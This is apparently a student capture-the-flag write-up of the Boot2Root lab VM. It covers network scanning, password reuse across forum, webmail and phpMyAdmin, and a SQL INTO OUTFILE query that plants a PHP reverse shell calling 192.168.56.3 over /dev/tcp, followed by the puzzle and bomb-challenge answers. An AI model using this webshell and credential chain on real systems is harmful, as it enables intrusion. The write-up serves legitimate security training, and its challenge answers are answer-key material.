# Boot2Root

## Write-Up 1

### Step: Scan network
#### Why

We don't know anything about the VM except that we share the same network

#### How

With `nmap 192.168.56.0/24`, we scan the network.

#### What

We get some of IP's on the network and information about services and open ports on each machine

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 15:03 CEST
Nmap scan report for 192.168.56.1
Host is up (0.00032s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 192.168.56.2
Host is up (0.00056s latency).
All 1000 scanned ports on 192.168.56.2 are closed

Nmap scan report for 192.168.56.6
Host is up (0.10s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 256 IP addresses (3 hosts up) scanned in 12.75 seconds
```

### Step: Try FTP connection
#### Why

We know there is a FTP service on port 21

Most security flaw come from humans error, so we connect to ftp to see if a password is requiered

#### How

With `sftp $TARGET_USER@$TARGET_IP`, we connect to ftp service

#### What

However they ask us some password and we don't know it.

```
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
root@192.168.56.6's password:
Connection closed.
```

### Step: Try SSH connection
#### Why

We know there is a SSH service on port 22

Most security flaw come from humans error, so we connect to SSH to see if a password is requiered

#### How

With `ssh "${TARGET_USER}@${TARGET_IP}"`, we connect to SSH service

#### What

However they ask us some password again and we don't know it either.

```
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
root@192.168.56.6's password:
```

### Step: Try Web Browser
#### Why

We know there is an http and https service on port 80 and 443

We could acces to the 'public' side of the target

#### How

Opening the browser and going to the target's address will lead to the public html page

#### What

There is nothing interresting on this page

### Step: Detect common routes
#### Why

Some sites have hidden page, we are looking for the same here, just in case.

#### How

We are using `nmap --script=http-enum "${TARGET_IP}"` to detect the common routes on this site

#### What

This give us precious information

```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
| http-enum:
|   /forum/: Forum
|   /phpmyadmin/: phpMyAdmin
|   /webmail/src/login.php: squirrelmail version 1.4.22
|_  /webmail/images/sm_logo.png: SquirrelMail
993/tcp open  imaps
```

### Step: Scan the Forum
#### Why

Messages with sensitive data inside are common on any forum

#### How

We are taking a look form the web browser

#### What

We find 4 threads, one of them is intitled `Probleme login ?`
> It's written by `lmezard` and we find this password `!q\]Ej?*5K5cy*AJ` with some sshd failed connexion logs

### Step: Try password against SSH
#### Why

In the SSH logs, the user send his password within the username field which is not encrypted

#### How

We connect with `ssh lmezard@${TARGET_IP}`

#### What

We had hope but it's no surprise, this don't allow us

```
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
lmezard@192.168.56.6's password:
Permission denied, please try again.
lmezard@192.168.56.6's password:
```

### Step: Looking for data about lmezard
#### Why

This person is a (potential) security flaw. We should look deeper to see if any sensitive data were leaked somewhere

#### How

On the forum page there's a userspace, when comes times to login

What a surprise, we gain access with username: `lmezard` and the password: `!q\]Ej?*5K5cy*AJ`

#### What

Clicking on the user profile shows us the user's email `laurie@borntosec.net`

### Step: Try Webmail
#### Why

- We see that the domain name of the email is `borntosec.net`
- So go directly to the webmail

#### How

With the web browser, we go to `/webmail/src/login.php`

We try to connect with the previous user and password

#### What

Once connected ( because this is the same password, believe it or not), we can find mails that laurie received

There is a mail with DB access for phpmyadmin

### Step: Connecting to PhpMyAdmin
#### Why

Because this is where we can find datas and php execution

#### How

we can connect with user: `root` and password: `Fg-'kKXBj87E:aJ$`

#### What

We have now access to the databases

### Step: Executing Php code
#### Why

To run arbitrary code on the server side and gather more information, both could lead to privilege escalation

#### How

From the SQl panel:

We can forge request to create a php file with code in it

`SELECT "<?= exec('/bin/bash -c \"bash -i 2>&1 > /dev/tcp/192.168.56.3/8080 0>&1 \"');" INTO OUTFILE '/var/www/forum/templates_c/1.php'`

#### What

We have now a remote shell that runs on the server side

### Step
#### Why
#### How
#### What

------------------------------------

we cat the file in `/home/LOOKATME/password`

we found inside the lmezard's password
```
cat LOOKATME
^[[A 2>&1
cat: LOOKATME: Is a directory
ls LOOKATME
password
cat LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```
> lmezard doesn't have SSH access

we can log with the user and password

A README file tell us that we have to solve the fun challenge to get the ssh password for laurie user

Fun is a tar archive, with a c code split in many text files

after reagrrange files in order we can see that laurie password is a sha256 hash `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` from the string `Iheartpwnage`
:wq:wq
After connect to laurie by ssh, another README tell us to solve the bomb challenge to get the Thor's password

The Bomb is a program that takes lines in input. There is 6 Phases (Levels)

Phase 1:

`Public speaking is very easy.`

Phase 2:
> 6 numbers following the `U(n+1)=n+1*U(n)` suite

`1 2 6 24 120 720`

Phase 3:
> There is 8 correct answer, under the format `%d %c %d`

`0 q 777`
`1 b 214`
`2 b 755`
`3 k 251`
`4 o 160`
`5 t 458`
`6 v 780`
`7 b 524`

> For the final answer only this soltuion works: `1 b 214`


Phase 4:
> Fibonacci suite, we search for fibonacci(x)=55

`9`

> There is a secret phase, who don't change the final result with `9 austinpowers` and the solution is `1001`

Phase 5:
> Matching between a formula's result on 6 char long string and the string `giants`

`opekmq`

Phase 6:
> 6 node of a chained list, that we need to reorder in decending order. Specify the order with 6 digits between 1-6

`4 2 6 3 1 5`

`Publicspeakingisveryeasy.126241207201b2149opekmq426315`
> We got an asset that tells we need to permute the n-1 and n-2 chars in the key

`Publicspeakingisveryeasy.126241207201b2149opekmq426135`
> this is thor's ssh password

In thor Home there is a turtle bot who draw `SLASH` on the screen, the readme wink us with a `digest` reference who leads us to hash the word and md5 is our key for the zaz kingdom

